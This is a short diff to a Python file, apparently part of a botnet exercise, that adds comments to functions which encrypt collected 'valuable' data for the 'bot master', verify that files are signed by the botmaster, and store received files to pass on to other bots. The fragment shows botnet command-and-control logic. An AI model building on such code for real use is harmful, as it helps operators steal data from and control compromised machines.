@@ -16,9 +16,11 @@ def save_valuable(data):
 
 def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
-
+    #use rsa 4096 bit public key stored on disk
     publicKey = open('keys\public.key',"r").read()
+    #use public key rsa as encrypter
     rsaEncrypter = RSA.importKey(publicKey)
+    #encrypt data, null value is there for previous versions - isn't needed 
     EncryptedData = rsaEncrypter.encrypt(data, 0)
     
     return EncryptedData[0]
@@ -46,7 +48,7 @@ def verify_file(f):
     signature = f[:512]
     #Get the file data
     Rf = f[512:]
-    #hash it
+    #get signature info to be used later for vertification
     signer = PKCS1_v1_5.new(RSA.importKey(open('keys\public.key',"r").read()))
 
     #vertify if sent by botmaster
@@ -59,8 +61,6 @@ def process_file(fn, f):
         # If it was, store it unmodified
         # (so it can be sent to other bots)
         # Decrypt and run the file
-        
-        
         filestore[fn] = f
         print("Stored the received file as %s" % fn)
     else:
